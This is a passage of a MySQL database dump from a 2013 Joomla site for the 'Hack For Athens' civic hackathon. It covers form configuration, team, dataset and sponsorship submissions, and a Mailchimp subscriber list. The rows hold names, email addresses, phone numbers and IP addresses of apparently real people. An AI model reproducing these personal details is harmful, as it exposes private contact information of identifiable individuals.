(\n    \'input_textarea_46_input_id\' => \'\',\n    \'input_textarea_46_label_text\' => \'Members\',\n    \'input_textarea_46_input_name\' => \'members\',\n    \'input_textarea_46_input_value\' => \'\',\n    \'input_textarea_46_input_class\' => \'\',\n    \'input_textarea_46_input_title\' => \'\',\n    \'input_textarea_46_label_over\' => \'0\',\n    \'input_textarea_46_hide_label\' => \'0\',\n    \'input_textarea_46_input_cols\' => \'45\',\n    \'input_textarea_46_input_rows\' => \'12\',\n    \'input_textarea_46_wysiwyg_editor\' => \'0\',\n    \'input_textarea_46_editor_buttons\' => \'1\',\n    \'input_textarea_46_editor_width\' => \'400\',\n    \'input_textarea_46_editor_height\' => \'200\',\n    \'input_textarea_46_multiline_start\' => \'0\',\n    \'input_textarea_46_multiline_add\' => \'0\',\n    \'input_textarea_46_validations\' => \'required\',\n    \'input_textarea_46_instructions\' => \'\',\n    \'input_textarea_46_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'textarea\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_43\' => \n  array (\n    \'input_select_43_input_id\' => \'\',\n    \'input_select_43_label_text\' => \'Challenge\',\n    \'input_select_43_input_name\' => \'challenge\',\n    \'input_select_43_size\' => \'1\',\n    \'input_select_43_input_class\' => \'\',\n    \'input_select_43_input_title\' => \'\',\n    \'input_select_43_label_over\' => \'0\',\n    \'input_select_43_hide_label\' => \'0\',\n    \'input_select_43_selected\' => \'\',\n    \'input_select_43_showempty\' => \'\',\n    \'input_select_43_multiple\' => \'0\',\n    \'input_select_43_multiline_start\' => \'0\',\n    \'input_select_43_multiline_add\' => \'0\',\n    \'input_select_43_enable_dynamic_data\' => \'0\',\n    \'input_select_43_data_path\' => \'\',\n    \'input_select_43_value_key\' => \'\',\n    \'input_select_43_text_key\' => \'\',\n    \'input_select_43_options\' => \'No=No\r\nYes=Yes\',\n    \'input_select_43_validations\' => \'required\',\n    \'input_select_43_instructions\' => \'\',\n    \'input_select_43_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'select\',\n    \'container_id\' => \'9\',\n  ),\n  \'field_5\' => \n  array (\n    \'input_captcha_5_input_id\' => \'\',\n    \'input_captcha_5_label_text\' => \'Enter the code\',\n    \'input_captcha_5_input_name\' => \'chrono_verification\',\n    \'input_captcha_5_input_value\' => \'\',\n    \'input_captcha_5_input_maxlength\' => \'5\',\n    \'input_captcha_5_input_size\' => \'5\',\n    \'input_captcha_5_input_class\' => \'chrono_captcha_input\',\n    \'input_captcha_5_input_title\' => \'\',\n    \'input_captcha_5_label_over\' => \'0\',\n    \'input_captcha_5_hide_label\' => \'0\',\n    \'input_captcha_5_validations\' => \'\',\n    \'input_captcha_5_instructions\' => \'\',\n    \'input_captcha_5_tooltip\' => \'\',\n    \'tag\' => \'input\',\n    \'type\' => \'captcha\',\n    \'real_type\' => \'text\',\n    \'after\' => \'{chronocaptcha_img}\',\n    \'container_id\' => \'0\',\n  ),\n  \'field_6\' => \n  array (\n    \'input_submit_6_input_id\' => \'\',\n    \'input_submit_6_input_name\' => \'input_submit_6\',\n    \'input_submit_6_input_value\' => \'Submit\',\n    \'input_submit_6_input_class\' => \'\',\n    \'input_submit_6_button_type\' => \'submit\',\n    \'input_submit_6_button_align\' => \'left\',\n    \'input_submit_6_back_button\' => \'0\',\n    \'input_submit_6_reset_button\' => \'0\',\n    \'input_submit_6_back_button_value\' => \'Back\',\n    \'input_submit_6_reset_button_value\' => \'Reset\',\n    \'input_submit_6_multiline_start\' => \'0\',\n    \'input_submit_6_multiline_add\' => \'0\',\n    \'tag\' => \'input\',\n    \'type\' => \'submit\',\n    \'container_id\' => \'0\',\n  ),\n)','YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjQ6ImxvYWQiO2E6MTp7czo3OiJhY3Rpb25zIjthOjQ6e3M6MTg6ImNmYWN0aW9uX2xvYWRfanNfMCI7czowOiIiO3M6MTk6ImNmYWN0aW9uX2xvYWRfY3NzXzEiO3M6MDoiIjtzOjIzOiJjZmFjdGlvbl9sb2FkX2NhcHRjaGFfMiI7czowOiIiO3M6MjA6ImNmYWN0aW9uX3Nob3dfaHRtbF8zIjtzOjA6IiI7fX1zOjY6InN1Ym1pdCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTI6e3M6MjQ6ImNmYWN0aW9uX2NoZWNrX2NhcHRjaGFfNCI7YToxOntzOjY6ImV2ZW50cyI7YToyOntzOjM3OiJjZmFjdGlvbmV2ZW50X2NoZWNrX2NhcHRjaGFfNF9zdWNjZXNzIjtzOjA6IiI7czozNDoiY2ZhY3Rpb25ldmVudF9jaGVja19jYXB0Y2hhXzRfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF81IjtzOjA6IiI7fX19fXM6MjM6ImNmYWN0aW9uX3VwbG9hZF9maWxlc182IjthOjE6e3M6NjoiZXZlbnRzIjthOjI6e3M6MzY6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfc3VjY2VzcyI7czowOiIiO3M6MzM6ImNmYWN0aW9uZXZlbnRfdXBsb2FkX2ZpbGVzXzZfZmFpbCI7YToxOntzOjc6ImFjdGlvbnMiO2E6MTp7czoyMToiY2ZhY3Rpb25fZXZlbnRfbG9vcF83IjtzOjA6IiI7fX19fXM6MjI6ImNmYWN0aW9uX2N1c3RvbV9jb2RlXzgiO3M6MDoiIjtzOjI1OiJjZmFjdGlvbl9oYW5kbGVfYXJyYXlzXzE2IjtzOjA6IiI7czoxODoiY2ZhY3Rpb25fZGJfc2F2ZV85IjtzOjA6IiI7czoxNzoiY2ZhY3Rpb25fZW1haWxfMTAiO3M6MDoiIjtzOjE3OiJjZmFjdGlvbl9lbWFpbF8xMSI7czowOiIiO3M6MTc6ImNmYWN0aW9uX2VtYWlsXzEyIjtzOjA6IiI7czoyMzoiY2ZhY3Rpb25fY3VzdG9tX2NvZGVfMTMiO3M6MDoiIjtzOjMxOiJjZmFjdGlvbl9zaG93X3RoYW5rc19tZXNzYWdlXzE0IjtzOjA6IiI7czoyNToiY2ZhY3Rpb25fcmVkaXJlY3RfdXNlcl8yMCI7czowOiIiO3M6MjA6ImNmYWN0aW9uX2RlYnVnZ2VyXzE4IjtzOjA6IiI7fX19fQ==','{\"form_mode\":\"easy\",\"form_method\":\"post\",\"auto_detect_settings\":\"1\",\"load_files\":\"2\",\"tight_layout\":\"0\",\"action_url\":\"\",\"form_tag_attach\":\"\",\"add_form_tags\":\"1\",\"relative_url\":\"1\",\"dynamic_files\":\"0\",\"show_top_errors\":\"1\",\"datepicker_config\":\"\",\"datepicker_type\":\"0\",\"datepicker_moo_style\":\"datepicker_dashboard\",\"enable_jsvalidation\":\"1\",\"jsvalidation_errors\":\"1\",\"jsvalidation_theme\":\"classic\",\"jsvalidation_lang\":\"en\",\"jsvalidation_showErrors\":\"0\",\"jsvalidation_errorsLocation\":\"1\",\"adminview_actions\":\"\",\"dataview_actions\":\"\",\"app_exclusive\":\"0\"}',1,'');
/*!40000 ALTER TABLE `hfa_chronoforms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoforms_data_Challenges`
--

DROP TABLE IF EXISTS `hfa_chronoforms_data_Challenges`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoforms_data_Challenges` (
  `cf_id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_uid` varchar(255) NOT NULL,
  `cf_created` datetime NOT NULL,
  `cf_modified` datetime NOT NULL,
  `cf_created_by` int(11) NOT NULL,
  `cf_modified_by` int(11) NOT NULL,
  `cf_ipaddress` varchar(255) NOT NULL,
  `cf_user_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `challenge_title` varchar(255) NOT NULL,
  `chrono_verification` varchar(255) NOT NULL,
  `input_submit_6` varchar(255) NOT NULL,
  PRIMARY KEY (`cf_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoforms_data_Challenges`
--

LOCK TABLES `hfa_chronoforms_data_Challenges` WRITE;
/*!40000 ALTER TABLE `hfa_chronoforms_data_Challenges` DISABLE KEYS */;
INSERT INTO `hfa_chronoforms_data_Challenges` VALUES (1,'5ac84f776753f9dd2b5195e02aa32361','2013-05-10 23:12:25','0000-00-00 00:00:00',0,0,'96.32.151.209',0,'MerryWater','charles@geographic.info','706.424.4824','Mosquitos Suck Bloods','HBca2','Submit'),(2,'035571b621a2ab2962cf045e9b97d73e','2013-05-22 20:21:59','0000-00-00 00:00:00',0,0,'75.137.8.245',0,'Nina Kelly (Athens resident)','nina.e.kelly@gmail.com','5867030375','Athens Neighborhood Wireless Challenge','6WcNS','Submit');
/*!40000 ALTER TABLE `hfa_chronoforms_data_Challenges` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoforms_data_Datasets`
--

DROP TABLE IF EXISTS `hfa_chronoforms_data_Datasets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoforms_data_Datasets` (
  `cf_id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_uid` varchar(255) NOT NULL,
  `cf_created` datetime NOT NULL,
  `cf_modified` datetime NOT NULL,
  `cf_created_by` int(11) NOT NULL,
  `cf_modified_by` int(11) NOT NULL,
  `cf_ipaddress` varchar(255) NOT NULL,
  `cf_user_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `dataset_title` varchar(255) NOT NULL,
  `dataset_url` varchar(255) NOT NULL,
  `format` varchar(255) NOT NULL,
  `chrono_verification` varchar(255) NOT NULL,
  `input_submit_6` varchar(255) NOT NULL,
  PRIMARY KEY (`cf_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoforms_data_Datasets`
--

LOCK TABLES `hfa_chronoforms_data_Datasets` WRITE;
/*!40000 ALTER TABLE `hfa_chronoforms_data_Datasets` DISABLE KEYS */;
INSERT INTO `hfa_chronoforms_data_Datasets` VALUES (1,'5a15cf303ebcb3c6abc12be4101566ee','2013-05-20 13:54:34','0000-00-00 00:00:00',0,0,'75.131.181.3',0,'Nina Kelly','nina.e.kelly@gmail.com','5867030375','US Broadband Subscribership','http://investigativereportingworkshop.org/investigations/broadband-adoption/story/data-broadband-files/','CSV','YuMi5','Submit'),(2,'7b8d1c3df4ae9d214fcbd8ce1b78e3be','2013-05-20 14:03:33','0000-00-00 00:00:00',0,0,'75.131.181.3',0,'Nina Kelly','nina.e.kelly@gmail.com','5867030375','American Community Survey 2007-2011 Selected Economic Characteristics by Census tract','http://factfinder2.census.gov/faces/tableservices/jsf/pages/productview.xhtml?pid=ACS_11_5YR_DP03&prodType=table','CSV','S4LVk','Submit'),(3,'dacccceceaae1cd091d47cbe81e4b2e1','2013-05-20 14:40:15','0000-00-00 00:00:00',0,0,'75.131.181.3',0,'Nina Kelly','nina.e.kelly@gmail.com','5867030375','Athens Registered Neighborhoods','http://athensclarkecounty.com/index.aspx?NID=1758','Other','5TCKe','Submit');
/*!40000 ALTER TABLE `hfa_chronoforms_data_Datasets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoforms_data_Groups`
--

DROP TABLE IF EXISTS `hfa_chronoforms_data_Groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoforms_data_Groups` (
  `cf_id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_uid` varchar(255) NOT NULL,
  `cf_created` datetime NOT NULL,
  `cf_modified` datetime NOT NULL,
  `cf_created_by` int(11) NOT NULL,
  `cf_modified_by` int(11) NOT NULL,
  `cf_ipaddress` varchar(255) NOT NULL,
  `cf_user_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `members` varchar(255) NOT NULL,
  `challenge` varchar(255) NOT NULL,
  `chrono_verification` varchar(255) NOT NULL,
  `input_submit_6` varchar(255) NOT NULL,
  PRIMARY KEY (`cf_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoforms_data_Groups`
--

LOCK TABLES `hfa_chronoforms_data_Groups` WRITE;
/*!40000 ALTER TABLE `hfa_chronoforms_data_Groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_chronoforms_data_Groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoforms_data_Sponsorship`
--

DROP TABLE IF EXISTS `hfa_chronoforms_data_Sponsorship`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoforms_data_Sponsorship` (
  `cf_id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_uid` varchar(255) NOT NULL,
  `cf_created` datetime NOT NULL,
  `cf_modified` datetime NOT NULL,
  `cf_created_by` int(11) NOT NULL,
  `cf_modified_by` int(11) NOT NULL,
  `cf_ipaddress` varchar(255) NOT NULL,
  `cf_user_id` int(11) NOT NULL,
  `organization` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `dataset_url` varchar(255) NOT NULL,
  `sponsorship_level` varchar(255) NOT NULL,
  `chrono_verification` varchar(255) NOT NULL,
  `input_submit_6` varchar(255) NOT NULL,
  PRIMARY KEY (`cf_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoforms_data_Sponsorship`
--

LOCK TABLES `hfa_chronoforms_data_Sponsorship` WRITE;
/*!40000 ALTER TABLE `hfa_chronoforms_data_Sponsorship` DISABLE KEYS */;
INSERT INTO `hfa_chronoforms_data_Sponsorship` VALUES (1,'bbc8e4b363aac193123a3c7f4ab259fa','2013-04-23 20:54:30','0000-00-00 00:00:00',0,0,'72.145.217.70',0,'Test','test@test.com','1112228888','','Venture','cKR3J','Submit'),(2,'4a51dfaee8f2edde6cd6ce618ab1b5fc','2013-04-23 20:57:08','0000-00-00 00:00:00',0,0,'72.145.217.70',0,'Test','test@test.com','1112223333','','Angel','y8Dr9','Submit'),(3,'3e67bd81b2a978cc84577076ffdc5270','2013-04-23 20:57:46','0000-00-00 00:00:00',0,0,'72.145.217.70',0,'Test','test@test.com','1112223333','','Angel','BYMz5','Submit'),(4,'deac8af7bfabe1adae04a85dd678dbb8','2013-04-23 21:02:36','0000-00-00 00:00:00',0,0,'72.145.217.70',0,'Test','test@test.com','1112223333','','Angel','YZqpN','Submit'),(5,'7979a8755c8cdceb59c8c7a06c2273bb','2013-05-20 14:43:54','0000-00-00 00:00:00',0,0,'72.12.25.73',0,'test','test@test.com','7066213630','','Boostrap','6pJti','Submit');
/*!40000 ALTER TABLE `hfa_chronoforms_data_Sponsorship` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoforms_data_Teams`
--

DROP TABLE IF EXISTS `hfa_chronoforms_data_Teams`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoforms_data_Teams` (
  `cf_id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_uid` varchar(255) NOT NULL,
  `cf_created` datetime NOT NULL,
  `cf_modified` datetime NOT NULL,
  `cf_created_by` int(11) NOT NULL,
  `cf_modified_by` int(11) NOT NULL,
  `cf_ipaddress` varchar(255) NOT NULL,
  `cf_user_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `members` varchar(255) NOT NULL,
  `challenge` varchar(255) NOT NULL,
  `chrono_verification` varchar(255) NOT NULL,
  `input_submit_6` varchar(255) NOT NULL,
  PRIMARY KEY (`cf_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoforms_data_Teams`
--

LOCK TABLES `hfa_chronoforms_data_Teams` WRITE;
/*!40000 ALTER TABLE `hfa_chronoforms_data_Teams` DISABLE KEYS */;
INSERT INTO `hfa_chronoforms_data_Teams` VALUES (1,'e1799c3a7cdd3ed2c86799e266b75c63','2013-05-29 18:17:04','0000-00-00 00:00:00',0,0,'72.145.233.14',0,'test','test, test, test','test test','uJZ9y','Submit'),(2,'d9b906c01f5652b68d40ec85f8eb79c3','2013-06-01 13:00:48','0000-00-00 00:00:00',256,0,'198.137.20.100',256,'The hotdawgs','Glenn Stovall\r\nJonathan Wallace\r\nAmanda Newell\r\nJenni Johnson','Open Data Portal Challenge','6PJea','Submit'),(3,'0ed9a46fead44ae0f53f1cd1e5100952','2013-06-01 13:44:39','0000-00-00 00:00:00',268,0,'198.137.20.71',268,'Team Internets','Jordan Burke\r\nAngel Brown\r\nPeter Walker\r\nMike Wilbur\r\nSean Dunn','Athens Affordable Internet Challenge','eB53W','Submit'),(4,'ab719ee7bdb27575e1e1105174c2e5eb','2013-06-01 15:01:50','0000-00-00 00:00:00',0,0,'198.137.20.168',0,'Engage Athens ','Travis Douce\r\nStacey Kerr\r\nAnkur Vashi\r\nScott Shamp\r\nHenry Oddi \r\nDoug Brewer ','Visualizing Need to Motivate Change ','nqi62','Submit'),(5,'10bb0ec39719afb3d26325b11fff69dd','2013-06-01 17:12:48','0000-00-00 00:00:00',313,0,'198.137.20.229',313,'Safe Water Athens','Baron Chandler\r\nChris Sparnicht','Safe Drinking Water Challenge','5sXpG','Submit');
/*!40000 ALTER TABLE `hfa_chronoforms_data_Teams` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_cmc_lists`
--

DROP TABLE IF EXISTS `hfa_cmc_lists`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_cmc_lists` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `mc_id` varchar(10) NOT NULL,
  `web_id` int(11) NOT NULL,
  `list_name` varchar(255) NOT NULL,
  `date_created` datetime NOT NULL,
  `email_type_option` tinyint(1) NOT NULL DEFAULT '0',
  `use_awesomebar` tinyint(1) NOT NULL DEFAULT '1',
  `default_from_name` varchar(255) NOT NULL,
  `default_from_email` varchar(255) NOT NULL,
  `default_subject` varchar(255) DEFAULT NULL,
  `default_language` varchar(10) NOT NULL DEFAULT 'en',
  `list_rating` float(5,4) NOT NULL DEFAULT '0.0000',
  `subscribe_url_short` varchar(255) NOT NULL,
  `subscribe_url_long` varchar(255) NOT NULL,
  `beamer_address` varchar(255) NOT NULL,
  `visibility` varchar(255) NOT NULL DEFAULT 'pub',
  `created_user_id` int(11) NOT NULL,
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(11) NOT NULL,
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `access` int(10) NOT NULL DEFAULT '0',
  `query_data` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_cmc_lists`
--

LOCK TABLES `hfa_cmc_lists` WRITE;
/*!40000 ALTER TABLE `hfa_cmc_lists` DISABLE KEYS */;
INSERT INTO `hfa_cmc_lists` VALUES (1,'1e4599e8a6',6289,'Hack For Athens','2013-05-15 01:40:35',1,1,'Hack For Athens','support@hackforathens.org','Hack For Athens | Update','en',0.0000,'http://eepurl.com/zxbrv','http://blackboxoperations.us7.list-manage.com/subscribe?u=22e33e92371ffe576da548388&id=1e4599e8a6','MjJlMzNlOTIzNzFmZmU1NzZkYTU0ODM4OC0wMDU3NzZmZS1hYzg4LTQwNTktOWQzMC1lMDY2MWE1NWQ3YjE=@campaigns.mailchimp.com','pub',254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05',1,'{\"id\":\"1e4599e8a6\",\"web_id\":6289,\"name\":\"Hack For Athens\",\"date_created\":\"2013-05-15 01:40:35\",\"email_type_option\":true,\"use_awesomebar\":true,\"default_from_name\":\"Hack For Athens\",\"default_from_email\":\"support@hackforathens.org\",\"default_subject\":\"Hack For Athens | Update\",\"default_language\":\"en\",\"list_rating\":0,\"subscribe_url_short\":\"http:\\/\\/eepurl.com\\/zxbrv\",\"subscribe_url_long\":\"http:\\/\\/blackboxoperations.us7.list-manage.com\\/subscribe?u=22e33e92371ffe576da548388&id=1e4599e8a6\",\"beamer_address\":\"MjJlMzNlOTIzNzFmZmU1NzZkYTU0ODM4OC0wMDU3NzZmZS1hYzg4LTQwNTktOWQzMC1lMDY2MWE1NWQ3YjE=@campaigns.mailchimp.com\",\"visibility\":\"pub\",\"stats\":{\"member_count\":27,\"unsubscribe_count\":0,\"cleaned_count\":0,\"member_count_since_send\":2,\"unsubscribe_count_since_send\":0,\"cleaned_count_since_send\":0,\"campaign_count\":0,\"grouping_count\":0,\"group_count\":0,\"merge_var_count\":2,\"avg_sub_rate\":null,\"avg_unsub_rate\":null,\"target_sub_rate\":null,\"open_rate\":null,\"click_rate\":null},\"modules\":[],\"list_name\":\"1e4599e8a6\"}');
/*!40000 ALTER TABLE `hfa_cmc_lists` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_cmc_users`
--

DROP TABLE IF EXISTS `hfa_cmc_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_cmc_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `mc_id` varchar(255) DEFAULT NULL,
  `list_id` varchar(255) NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `firstname` varchar(255) DEFAULT NULL,
  `lastname` varchar(500) DEFAULT NULL,
  `email` varchar(500) NOT NULL,
  `email_type` varchar(500) NOT NULL DEFAULT 'html',
  `interests` text,
  `merges` text,
  `status` varchar(255) NOT NULL DEFAULT 'subscribed',
  `ip_signup` varchar(255) DEFAULT NULL,
  `timestamp_signup` datetime NOT NULL,
  `ip_opt` varchar(255) DEFAULT NULL,
  `timestamp_opt` datetime NOT NULL,
  `member_rating` tinyint(2) NOT NULL DEFAULT '2',
  `campaign_id` int(11) NOT NULL,
  `lists` varchar(255) DEFAULT NULL,
  `timestamp` datetime NOT NULL,
  `info_changed` datetime NOT NULL,
  `web_id` varchar(255) DEFAULT NULL,
  `language` varchar(255) DEFAULT 'en',
  `is_gmonkey` tinyint(1) NOT NULL DEFAULT '0',
  `geo` text COMMENT 'json',
  `clients` text COMMENT 'json',
  `static_segments` text COMMENT 'json',
  `created_user_id` int(11) NOT NULL,
  `created_time` datetime NOT NULL,
  `modified_user_id` int(11) NOT NULL,
  `modified_time` datetime NOT NULL,
  `query_data` text COMMENT 'json',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_cmc_users`
--

LOCK TABLES `hfa_cmc_users` WRITE;
/*!40000 ALTER TABLE `hfa_cmc_users` DISABLE KEYS */;
INSERT INTO `hfa_cmc_users` VALUES (1,NULL,'1e4599e8a6',0,NULL,NULL,'tumu@worldofbeverage.net','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:57:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"tumu@worldofbeverage.net\",\"timestamp\":\"2013-05-15 01:57:44\"}'),(2,NULL,'1e4599e8a6',0,NULL,NULL,'kellyannryder@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"kellyannryder@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(3,NULL,'1e4599e8a6',0,NULL,NULL,'kevinpfeiffer729@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"kevinpfeiffer729@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(4,NULL,'1e4599e8a6',0,NULL,NULL,'loukaram@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"loukaram@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(5,NULL,'1e4599e8a6',0,NULL,NULL,'me@jordankburke.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"me@jordankburke.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(6,NULL,'1e4599e8a6',0,NULL,NULL,'mepcotterell@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"mepcotterell@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(7,NULL,'1e4599e8a6',0,NULL,NULL,'mrwilson@uga.edu','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"mrwilson@uga.edu\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(8,NULL,'1e4599e8a6',0,NULL,NULL,'omoimasuyo@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"omoimasuyo@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(9,NULL,'1e4599e8a6',0,NULL,NULL,'stormymx@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"stormymx@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(10,NULL,'1e4599e8a6',0,NULL,NULL,'support@hackforathens.org','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"support@hackforathens.org\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(11,NULL,'1e4599e8a6',0,NULL,NULL,'travisdouce@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"travisdouce@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(12,NULL,'1e4599e8a6',0,NULL,NULL,'am.nguyen39@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"am.nguyen39@gmail.com\",\"timestamp\":\"2013-05-15 01:58:44\"}'),(13,NULL,'1e4599e8a6',0,NULL,NULL,'jonathan.wallace@gmail.com','html',NULL,NULL,'subscribed',NULL,'0000-00-00 00:00:00',NULL,'0000-00-00 00:00:00',2,0,NULL,'2013-05-15 01:58:44','0000-00-00 00:00:00',NULL,'en',0,NULL,NULL,NULL,254,'2013-05-15 01:53:05',254,'2013-05-15 01:53:05','{\"email\":\"jonathan.wallace@gmail.com\",\"timestamp\":\"2013-05-15 